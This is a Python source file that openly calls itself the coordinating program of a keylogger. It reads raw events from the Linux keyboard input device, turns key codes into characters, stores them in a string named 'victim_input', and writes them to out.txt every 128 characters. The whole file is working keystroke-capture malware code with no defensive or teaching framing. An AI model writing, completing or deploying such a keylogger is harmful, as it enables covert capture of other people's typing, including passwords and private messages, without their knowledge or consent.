# Main coordinating program to control the function of the keylogger
# Logic credit to Nicolas Chabrilliat at dzone.com

import struct
import find_keyboard
import qwerty


def main():
    # Get the file for keyboard inputs
    filepath = find_keyboard.find_keyboard()
    event_file = open(filepath, "rb")

    # import the list of characters that we scan for
    input_map = qwerty.map

    search_format = 'llHHI'
    event_size = struct.calcsize(search_format)

    event = event_file.read(event_size)
    victim_input = ""

    while event:
        (_, _, event_type, code, value) = struct.unpack(search_format, event)

        if code != 0 and event_type == 1 and value == 1:
            if code in input_map:
                victim_input += input_map[code]

        event = event_file.read(event_size)
        if len(victim_input) == 128:
            with open("out.txt", "a") as f:
                f.write(victim_input)
                victim_input = ""